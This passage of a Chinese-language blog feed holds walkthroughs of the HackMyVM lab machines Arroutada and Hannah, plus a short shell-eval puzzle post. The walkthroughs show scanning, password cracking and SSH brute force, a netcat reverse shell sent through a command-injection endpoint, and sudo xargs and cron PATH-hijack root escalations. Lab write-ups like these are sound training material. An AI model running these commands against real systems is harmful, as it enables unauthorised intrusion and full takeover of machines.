+OS:R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T
+OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
+OS:0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(
+OS:R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 1 hop
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 18.31 seconds
+```
+
+扫描结果显示目标机器开放了 22 (SSH) 和 80 (HTTP) 端口。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_airbind.html</guid><pubDate>Thu, 20 Mar 2025 07:51:14 +0000</pubDate></item><item><title>群主题</title><link>https://7r1UMPH.github.io/post/qun-zhu-ti.html</link><description>好久没打过靶机了，也没更新过，今天在群里看到了群主发了一个题目就玩了一下，顺便水一期wp
+
+题目：
+
+![image-20250322153403638](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250322153403675.png)
+
+```
+PATH=/usr/bin
+read INPUT &lt; &lt;(head -n1 | tr -d '[A-Za-z0-9/]')
+eval '$INPUT'
+```
+
+浅瞄了一眼，发现tr删除了所有字母、数字和斜杠，但保留特殊符号，那就有搞头
+
+ps:$@ 在 Shell 中表示脚本的所有参数，可被 eval 解析。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/qun-zhu-ti.html</guid><pubDate>Fri, 28 Feb 2025 07:38:41 +0000</pubDate></item><item><title>hmv_Arroutada</title><link>https://7r1UMPH.github.io/post/hmv_Arroutada.html</link><description># 0.简介
+
+靶机：https://hackmyvm.eu/machines/machine.php?vm=Arroutada
+ 难度：绿色
+ 目标 IP：192.168.205.151
+ 本机 IP：192.168.205.128
+
+# 1.扫描
+
+nmap起手
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -A -Pn -n --min-rate 10000 192.168.205.151
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-08 16:47 CST
+Nmap scan report for 192.168.205.151
+Host is up (0.00024s latency).
+Not shown: 999 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.54 ((Debian))
+|_http-server-header: Apache/2.4.54 (Debian)
+|_http-title: Site doesn't have a title (text/html).
+MAC Address: 08:00:27:06:46:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4)
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.24 ms 192.168.205.151
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.81 seconds
+                                                        
+```
+
+# 2.踩点
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.151
+&lt;div align='center'&gt;&lt;img src='imgs/apreton.png'&gt;&lt;/div&gt;
+```
+
+爆破目录
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ gobuster dir -u http://192.168.205.151 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,txt,md | grep -v '403'
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.205.151
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              php,html,txt,md
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/index.html           (Status: 200) [Size: 59]
+/.                    (Status: 200) [Size: 59]
+/imgs                 (Status: 301) [Size: 317] [--&gt; http://192.168.205.151/imgs/]
+/scout                (Status: 301) [Size: 318] [--&gt; http://192.168.205.151/scout/]
+Progress: 598000 / 598005 (100.00%)
+===============================================================                                                                      
+Finished
+===============================================================
+```
+
+查看/scout
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.151/scout/
+
+&lt;div&gt;
+&lt;p&gt;
+Hi, Telly,
+&lt;br&gt;
+&lt;br&gt;
+I just remembered that we had a folder with some important shared documents. The problem is that I don't know wich first path it was in, but I do know the second path. Graphically represented:
+&lt;br&gt;
+/scout/******/docs/
+&lt;br&gt;
+&lt;br&gt;
+With continued gratitude,
+&lt;br&gt;
+J1.
+&lt;/p&gt;
+&lt;/div&gt;
+&lt;!-- Stop please --&gt;
+```
+
+爆破
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ wfuzz -u '192.168.205.151/scout/FUZZ/docs/' -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 --hw 28 
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://192.168.205.151/scout/FUZZ/docs/
+Total requests: 119600
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                             
+=====================================================================
+
+000021664:   200        1016 L   12059 W    189769 Ch   'j2'                                                                
+
+Total time: 59.22016
+Processed Requests: 119600
+Filtered Requests: 119599
+Requests/sec.: 2019.582
+```
+
+![image-20250331185406586](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331185406653.png)
+
+pass.txt是废话，直接下shellfile.ods，然后有密码，我们爆破一下
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ file shellfile.ods                                            
+shellfile.ods: OpenDocument Spreadsheet
+┌──(kali㉿kali)-[~/test]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash             
+Using default input encoding: UTF-8
+Loaded 1 password hash (ODF, OpenDocument Star/Libre/OpenOffice [PBKDF2-SHA1 512/512 AVX512BW 16x BF/AES])
+Cost 1 (iteration count) is 100000 for all loaded hashes
+Cost 2 (crypto [0=Blowfish 1=AES]) is 1 for all loaded hashes
+Will run 12 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+john11           (shellfile.ods)   
+1g 0:00:00:08 DONE (2025-02-08 16:53) 0.1177g/s 1967p/s 1967c/s 1967C/s lachina..idiot
+Use the '--show --format=ODF' options to display all of the cracked passwords reliably
+Session completed. 
+```
+
+打开给了我们一个路径/thejabasshell.php，点进去是空白的，所以我们进行爆破
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ wfuzz -u 'http://192.168.205.151/thejabasshell.php?FUZZ=id' -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 --hw 0 
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://192.168.205.151/thejabasshell.php?FUZZ=id
+Total requests: 119600
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                             
+=====================================================================
+
+000000280:   200        0 L      5 W        33 Ch       'a'                                                                 
+000000557:   200        0 L      0 W        0 Ch        'Controls'                                                          
+
+Total time: 0
+Processed Requests: 474
+Filtered Requests: 473
+Requests/sec.: 0
+
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.151/thejabasshell.php?a=id
+Error: Problem with parameter 'b'                                                                                                                                
+```
+
+还要一个b的参数
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ wfuzz -u 'http://192.168.205.151/thejabasshell.php?a=id&amp;b=FUZZ' -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 --hw 5
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://192.168.205.151/thejabasshell.php?a=id&amp;b=FUZZ
+Total requests: 119600
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                             
+=====================================================================
+
+000001999:   200        1 L      3 W        54 Ch       'pass'                                                              
+ /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...
+
+Total time: 41.29983
+Processed Requests: 56690
+Filtered Requests: 56689
+Requests/sec.: 1372.644
+
+┌──(kali㉿kali)-[~/test]
+└─$ curl 'http://192.168.205.151/thejabasshell.php?a=id&amp;b=pass'
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+                        
+```
+
+使用a参数弹个shell回来就好了
+
+# 3. 获得稳定的 Shell
+
+获取反向 shell 后，通过以下命令获得稳定的交互式 TTY shell：
+
+```bash
+script /dev/null -c bash  
+ctrl+z  
+stty raw -echo; fg  
+reset xterm  
+export TERM=xterm  
+echo $SHELL  
+export SHELL=/bin/bash  
+stty rows 59 cols 236
+```
+
+# 4.提权
+
+```
+www-data@arroutada:/var/www/html$ ls -al
+total 24
+drwxr-xr-x  4 root root 4096 Jan  8  2023 .
+drwxr-xr-x  3 root root 4096 Jan  8  2023 ..
+drwxr-xr-x  2 root root 4096 Jan  8  2023 imgs
+-rw-r--r--  1 root root   59 Jan  8  2023 index.html
+drwxr-xr-x 22 root root 4096 Jan  8  2023 scout
+-rw-r--r--  1 root root  174 Jan  8  2023 thejabasshell.php
+www-data@arroutada:/var/www/html$ sudo -l
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for www-data: 
+sudo: a password is required
+www-data@arroutada:/var/www/html$ cd ..
+www-data@arroutada:/var/www$ ls -la
+total 12
+drwxr-xr-x  3 root root 4096 Jan  8  2023 .
+drwxr-xr-x 12 root root 4096 Jan  8  2023 ..
+drwxr-xr-x  4 root root 4096 Jan  8  2023 html
+www-data@arroutada:/var/www$ cd ..
+www-data@arroutada:/var$ ls -al
+total 48
+drwxr-xr-x 12 root root  4096 Jan  8  2023 .
+drwxr-xr-x 18 root root  4096 Jan  8  2023 ..
+drwxr-xr-x  2 root root  4096 Sep  3  2022 backups
+drwxr-xr-x 10 root root  4096 Jan  8  2023 cache
+drwxr-xr-x 26 root root  4096 Jan  8  2023 lib
+drwxrwsr-x  2 root staff 4096 Sep  3  2022 local
+lrwxrwxrwx  1 root root     9 Jan  8  2023 lock -&gt; /run/lock
+drwxr-xr-x  8 root root  4096 Jan  8  2023 log
+drwxrwsr-x  2 root mail  4096 Jan  8  2023 mail
+drwxr-xr-x  2 root root  4096 Jan  8  2023 opt
+lrwxrwxrwx  1 root root     4 Jan  8  2023 run -&gt; /run
+drwxr-xr-x  4 root root  4096 Jan  8  2023 spool
+drwxrwxrwt  2 root root  4096 Feb  8 03:46 tmp
+drwxr-xr-x  3 root root  4096 Jan  8  2023 www
+www-data@arroutada:/var$ cd /home/
+www-data@arroutada:/home$ ls -al
+total 12
+drwxr-xr-x  3 root  root  4096 Jan  8  2023 .
+drwxr-xr-x 18 root  root  4096 Jan  8  2023 ..
+drwxr-x---  3 drito drito 4096 Jan 10  2023 drito
+www-data@arroutada:/home$ cd /opt/
+www-data@arroutada:/opt$ ls -al
+total 8
+drwxr-xr-x  2 root root 4096 Jan  8  2023 .
+drwxr-xr-x 18 root root 4096 Jan  8  2023 ..
+www-data@arroutada:/opt$ cd /tmp/
+www-data@arroutada:/tmp$ sl -al
+bash: sl: command not found
+www-data@arroutada:/tmp$ ls -al
+total 8
+drwxrwxrwt  2 root root 4096 Feb  8 03:46 .
+drwxr-xr-x 18 root root 4096 Jan  8  2023 ..
+www-data@arroutada:/tmp$ cd /
+www-data@arroutada:/$ ls -la
+total 68
+drwxr-xr-x  18 root root  4096 Jan  8  2023 .
+drwxr-xr-x  18 root root  4096 Jan  8  2023 ..
+lrwxrwxrwx   1 root root     7 Jan  8  2023 bin -&gt; usr/bin
+drwxr-xr-x   3 root root  4096 Jan  8  2023 boot
+drwxr-xr-x  17 root root  3140 Feb  8 03:46 dev
+drwxr-xr-x  66 root root  4096 Feb  8 03:46 etc
+drwxr-xr-x   3 root root  4096 Jan  8  2023 home
+lrwxrwxrwx   1 root root    31 Jan  8  2023 initrd.img -&gt; boot/initrd.img-5.10.0-20-amd64
+lrwxrwxrwx   1 root root    31 Jan  8  2023 initrd.img.old -&gt; boot/initrd.img-5.10.0-18-amd64
+lrwxrwxrwx   1 root root     7 Jan  8  2023 lib -&gt; usr/lib
+lrwxrwxrwx   1 root root     9 Jan  8  2023 lib32 -&gt; usr/lib32
+lrwxrwxrwx   1 root root     9 Jan  8  2023 lib64 -&gt; usr/lib64
+lrwxrwxrwx   1 root root    10 Jan  8  2023 libx32 -&gt; usr/libx32
+drwx------   2 root root 16384 Jan  8  2023 lost+found
+drwxr-xr-x   3 root root  4096 Jan  8  2023 media
+drwxr-xr-x   2 root root  4096 Jan  8  2023 mnt
+drwxr-xr-x   2 root root  4096 Jan  8  2023 opt
+dr-xr-xr-x 150 root root     0 Feb  8 03:46 proc
+drwx------   3 root root  4096 Jan  8  2023 root
+drwxr-xr-x  17 root root   480 Feb  8 03:46 run
+lrwxrwxrwx   1 root root     8 Jan  8  2023 sbin -&gt; usr/sbin
+drwxr-xr-x   2 root root  4096 Jan  8  2023 srv
+dr-xr-xr-x  13 root root     0 Feb  8 03:46 sys
+drwxrwxrwt   2 root root  4096 Feb  8 03:46 tmp
+drwxr-xr-x  14 root root  4096 Jan  8  2023 usr
+drwxr-xr-x  12 root root  4096 Jan  8  2023 var
+lrwxrwxrwx   1 root root    28 Jan  8  2023 vmlinuz -&gt; boot/vmlinuz-5.10.0-20-amd64
+lrwxrwxrwx   1 root root    28 Jan  8  2023 vmlinuz.old -&gt; boot/vmlinuz-5.10.0-18-amd64
+www-data@arroutada:/$ find / -perm -4000 -type f 2&gt;/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/sudo
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/su
+/usr/bin/passwd
+/usr/bin/umount
+/usr/bin/mount
+/usr/bin/chfn
+/usr/bin/chsh
+www-data@arroutada:/$ /sbin/getcap -r / 2&gt;/dev/null
+/usr/bin/ping cap_net_raw=ep
+www-data@arroutada:/$ ss -tnlup
+Netid                   State                    Recv-Q                   Send-Q                                     Local Address:Port                                       Peer Address:Port                   Process                 
+udp                     UNCONN                   0                        0                                                0.0.0.0:68                                              0.0.0.0:*                                              
+tcp                     LISTEN                   0                        4096                                           127.0.0.1:8000                                            0.0.0.0:*                                              
+tcp                     LISTEN                   0                        511                                                    *:80                                                    *:*             
+```
+
+有个8000端口没有公开，所以我们要转发，但是它socat少了so，那我们直接找其他的工具吧
+
+```
+www-data@arroutada:/tmp$ curl http://127.0.0.1:5000
+bash: curl: command not found
+www-data@arroutada:/tmp$ wget http://127.0.0.1:8000
+--2025-02-08 04:00:55--  http://127.0.0.1:8000/
+Connecting to 127.0.0.1:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 319 [text/html]
+Saving to: 'index.html'
+
+index.html                                                   0%[                                                                       index.html                                                 100%[========================================================================================================================================&gt;]     319  --.-KB/s    in 0s    
+
+2025-02-08 04:00:55 (116 MB/s) - 'index.html' saved [319/319]
+
+www-data@arroutada:/tmp$ ls -la
+total 476
+drwxrwxrwt  2 root     root       4096 Feb  8 04:00 .
+drwxr-xr-x 18 root     root       4096 Jan  8  2023 ..
+-rw-r--r--  1 www-data www-data    319 Feb  8 04:00 index.html
+-rwxr-xr-x  1 www-data www-data 473256 Jan 29 19:48 socat
+www-data@arroutada:/tmp$ cat index.html 
+&lt;h1&gt;Service under maintenance&lt;/h1&gt;
+
+
+&lt;br&gt;
+
+
+&lt;h6&gt;This site is from ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;---.+++++++++++..&lt;&lt;++.&gt;++.&gt;-----------.++.++++++++.&lt;+++++.&gt;++++++++++++++.&lt;+++++++++.---------.&lt;.&gt;&gt;-----------------.-------.++.++++++++.------.+++++++++++++.+.&lt;&lt;+..&lt;/h6&gt;
+
+&lt;!-- Please sanitize /priv.php --&gt;
+```
+
+![image-20250331185429009](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331185429071.png)
+
+那我们看它提示的/priv.php
+
+```
+www-data@arroutada:/tmp$ wget http://127.0.0.1:8000/priv.php
+--2025-02-08 04:01:52--  http://127.0.0.1:8000/priv.php
+Connecting to 127.0.0.1:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: unspecified [text/html]
+Saving to: 'priv.php'
+
+priv.php                                                       [&lt;=&gt;                                                                    priv.php                                                       [ &lt;=&gt;                                                                                                                                     ]     308  --.-KB/s    in 0s    
+
+2025-02-08 04:01:52 (111 MB/s) - 'priv.php' saved [308]
+
+www-data@arroutada:/tmp$ cat priv.php 
+Error: the 'command' parameter is not specified in the request body.
+
+/*
+
+$json = file_get_contents('php://input');
+$data = json_decode($json, true);
+
+if (isset($data['command'])) {
+    system($data['command']);
+} else {
+    echo 'Error: the 'command' parameter is not specified in the request body.';
+}
+
+*/
+```
+
+说我们少了参数，我们加上就好了
+
+```
+www-data@arroutada:/tmp$ wget --post-data='{'command':'whoami'}' http://127.0.0.1:8000/priv.php -q -O -
+drito
+
+
+/*
+
+$json = file_get_contents('php://input');
+$data = json_decode($json, true);
+
+if (isset($data['command'])) {
+    system($data['command']);
+} else {
+    echo 'Error: the 'command' parameter is not specified in the request body.';
+}
+
+*/
+```
+
+利用
+
+```
+www-data@arroutada:/tmp$ wget --post-data='{'command':'nc 192.168.205.128 8888 -e /bin/bash'}' http://127.0.0.1:8000/priv.php -q -O -
+┌──(kali㉿kali)-[~/test]
+└─$ nc -lvnp 8888           
+listening on [any] 8888 ...
+connect to [192.168.205.128] from (UNKNOWN) [192.168.205.151] 60268
+id
+uid=1001(drito) gid=1001(drito) groups=1001(drito)
+```
+
+获取反向 shell 后，通过以下命令获得稳定的交互式 TTY shell：
+
+```bash
+script /dev/null -c bash  
+ctrl+z  
+stty raw -echo; fg  
+reset xterm  
+export TERM=xterm  
+echo $SHELL  
+export SHELL=/bin/bash  
+stty rows 59 cols 236
+```
+
+提权
+
+```
+drito@arroutada:~/web$ sudo -l
+Matching Defaults entries for drito on arroutada:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User drito may run the following commands on arroutada:
+    (ALL : ALL) NOPASSWD: /usr/bin/xargs
+```
+
+https://gtfobins.github.io/gtfobins/xargs/#sudo
+
+```bash
+drito@arroutada:~/web$ sudo xargs -a /dev/null bash
+root@arroutada:/home/drito/web# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+&lt;!-- ##{'timestamp':1739012133}## --&gt;。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_Arroutada.html</guid><pubDate>Sat, 08 Feb 2025 10:55:33 +0000</pubDate></item><item><title>hmv_hannah</title><link>https://7r1UMPH.github.io/post/hmv_hannah.html</link><description># hmv_hannah
+
+# 0.简介
+
+**靶机**：https://hackmyvm.eu/machines/machine.php?vm=Hannah  
+**难度**：绿色  
+**目标 IP**：192.168.205.150  
+**本机 IP**：192.168.205.128
+
+# 1.扫描
+
+​`nmap`​起手
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -A -Pn -n --min-rate 10000 192.168.205.150
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-08 16:07 CST
+Nmap scan report for 192.168.205.150
+Host is up (0.00031s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 5f:1c:78:36:99:05:32:09:82:d3:d5:05:4c:14:75:d1 (RSA)
+|   256 06:69:ef:97:9b:34:d7:f3:c7:96:60:d1:a1:ff:d8:2c (ECDSA)
+|_  256 85:3d:da:74:b2:68:4e:a6:f7:e5:f5:85:40:90:2e:9a (ED25519)
+|_auth-owners: root
+80/tcp  open  http    nginx 1.18.0
+|_http-server-header: nginx/1.18.0
+| http-robots.txt: 1 disallowed entry 
+|_/enlightenment
+|_http-title: Site doesn't have a title (text/html).
+|_auth-owners: moksha
+113/tcp open  ident?
+|_auth-owners: root
+MAC Address: 08:00:27:7C:E4:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Device type: general purpose|router
+Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.31 ms 192.168.205.150
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 79.58 seconds
+                                                   
+```
+
+113未知端口，优先查看
+
+# 2.踩点
+
+https://book.hacktricks.wiki/zh/network-services-pentesting/113-pentesting-ident.html#basic-information
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.150:113                                                                       
+curl: (56) Recv failure: 连接被对方重置
+                                                                                                                                    
+┌──(kali㉿kali)-[~/test]
+└─$ nc 192.168.205.150 113 
+hello 
+                                                                                                                                    
+┌──(kali㉿kali)-[~/test]
+└─$ nc -vn 192.168.205.150 113
+(UNKNOWN) [192.168.205.150] 113 (auth) open
+hello
+                            
+
+┌──(kali㉿kali)-[~/test]
+└─$ ident-user-enum 192.168.205.150 80 22 113
+ident-user-enum v1.0 ( http://pentestmonkey.net/tools/ident-user-enum )
+
+192.168.205.150:80      moksha
+192.168.205.150:22      root
+192.168.205.150:113     root
+                               
+```
+
+有一个moksha用户，我们尝试爆破ssh
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ hydra -l moksha -P /usr/share/wordlists/q5000.txt ssh://192.168.205.150 -V -I -u -f -e nsr -t 64
+
+Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-08 16:23:42
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 5003 login tries (l:1/p:5003), ~79 tries per task
+[DATA] attacking ssh://192.168.205.150:22/
+[22][ssh] host: 192.168.205.150   login: moksha   password: hannah
+[STATUS] attack finished for 192.168.205.150 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-08 16:23:44
+
+```
+
+我第一次爆破的时候没出来，真的有点无语
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ ssh moksha@192.168.205.150    
+moksha@192.168.205.150's password: 
+Linux hannah 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Wed Jan  4 10:45:54 2023 from 192.168.1.51
+moksha@hannah:~$ id
+uid=1000(moksha) gid=1000(moksha) grupos=1000(moksha),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
+
+```
+
+# 3.提权
+
+```
+moksha@hannah:~$ sudo -l
+-bash: sudo: orden no encontrada
+moksha@hannah:~$ which sudo
+moksha@hannah:~$ find / -name sudo 2&gt;/dev/null
+/usr/share/bash-completion/completions/sudo
+moksha@hannah:~$ /usr/share/bash-completion/completions/sudo -l
+-bash: /usr/share/bash-completion/completions/sudo: Permiso denegado
+moksha@hannah:~$ ls -la /usr/share/bash-completion/completions/sudo
+-rw-r--r-- 1 root root 1504 ago 12  2020 /usr/share/bash-completion/completions/sudo
+
+```
+
+我还以为又藏sudo呢
+
+```
+moksha@hannah:~$ ls -la
+total 32
+drwxr-xr-x 3 moksha moksha 4096 ene  4  2023 .
+drwxr-xr-x 3 root   root   4096 ene  4  2023 ..
+lrwxrwxrwx 1 moksha moksha    9 ene  4  2023 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 moksha moksha  220 ene  4  2023 .bash_logout
+-rw-r--r-- 1 moksha moksha 3526 ene  4  2023 .bashrc
+drwxr-xr-x 3 moksha moksha 4096 ene  4  2023 .local
+-rw-r--r-- 1 moksha moksha  807 ene  4  2023 .profile
+-rw------- 1 moksha moksha   14 ene  4  2023 user.txt
+-rw------- 1 moksha moksha   52 ene  4  2023 .Xauthority
+moksha@hannah:~$ cd ..
+moksha@hannah:/home$ ls -al
+total 12
+drwxr-xr-x  3 root   root   4096 ene  4  2023 .
+drwxr-xr-x 18 root   root   4096 ene  4  2023 ..
+drwxr-xr-x  3 moksha moksha 4096 ene  4  2023 moksha
+moksha@hannah:/home$ find / -perm -4000 -type f 2&gt;/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/bin/su
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/umount
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/mount
+moksha@hannah:/home$ /sbin/getcap -r / 2&gt;/dev/null
+/usr/bin/ping cap_net_raw=ep
+moksha@hannah:/home$ cat /etc/cron*
+cat: /etc/cron.d: Es un directorio
+cat: /etc/cron.daily: Es un directorio
+cat: /etc/cron.hourly: Es un directorio
+cat: /etc/cron.monthly: Es un directorio
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/media:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+* * * * * root touch /tmp/enlIghtenment
+17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
+#
+cat: /etc/cron.weekly: Es un directorio
+
+moksha@hannah:/tmp$ which touch
+/usr/bin/touch
+
+moksha@hannah:/tmp$ ls -la /media
+total 12
+drwxrwxrwx  3 root root 4096 ene  4  2023 .
+drwxr-xr-x 18 root root 4096 ene  4  2023 ..
+lrwxrwxrwx  1 root root    6 ene  4  2023 cdrom -&gt; cdrom0
+drwxr-xr-x  2 root root 4096 ene  4  2023 cdrom0
+
+```
+
+有一个定时任务，我们可以看到它的环境变量也有问题，所以
+
+```
+moksha@hannah:/tmp$ echo 'cp /bin/bash /tmp/sh;chmod u+s /tmp/sh' &gt; /media/touch
+moksha@hannah:/tmp$ ls /tmp/
+enlIghtenment
+systemd-private-7e7d884382b944e89570ebdfb081124b-systemd-logind.service-Bwv8Xg
+systemd-private-7e7d884382b944e89570ebdfb081124b-systemd-timesyncd.service-S60g6e
+moksha@hannah:/tmp$ chmod +x /media/touch
+
+```
+
+等子弹飞一会
+
+```
+moksha@hannah:/tmp$ ls
+enlIghtenment  systemd-private-7e7d884382b944e89570ebdfb081124b-systemd-logind.service-Bwv8Xg
+sh             systemd-private-7e7d884382b944e89570ebdfb081124b-systemd-timesyncd.service-S60g6e
+moksha@hannah:/tmp$ ./sh -p
+sh-5.1# id
+uid=1000(moksha) gid=1000(moksha) euid=0(root) grupos=1000(moksha),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
+
+```
+
